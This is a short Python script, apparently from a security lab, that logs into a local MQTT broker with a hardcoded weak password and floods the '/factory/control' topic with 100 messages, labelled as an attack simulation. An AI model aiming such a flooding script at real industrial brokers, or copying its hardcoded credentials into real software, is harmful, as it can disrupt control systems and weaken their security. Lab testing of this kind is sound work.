import time
import paho.mqtt.client as mqtt


BROKER = "localhost"
PORT = 1883
TOPIC = "/factory/control"

USERNAME = "agentsec"
PASSWORD = "1234"


def main():

    print("=" * 60)
    print("             MQTT FLOOD ATTACK")
    print("=" * 60)

    print()
    print("Connecting to MQTT broker...")

    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2
    )

    client.username_pw_set(
        USERNAME,
        PASSWORD
    )

    try:

        client.connect(
            BROKER,
            PORT,
            60
        )

        client.loop_start()

        print("Connected successfully.")
        print()

        print("Starting MQTT flood...")
        print()

        for i in range(100):

            payload = f"flood_message={i}"

            client.publish(
                TOPIC,
                payload
            )

            print(
                f"Flood message #{i + 1}: {payload}"
            )

            time.sleep(0.01)

        print()
        print("=" * 60)
        print("MQTT flood attack simulation completed.")
        print("=" * 60)

    except Exception as e:

        print()
        print("Error:", e)

    finally:

        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()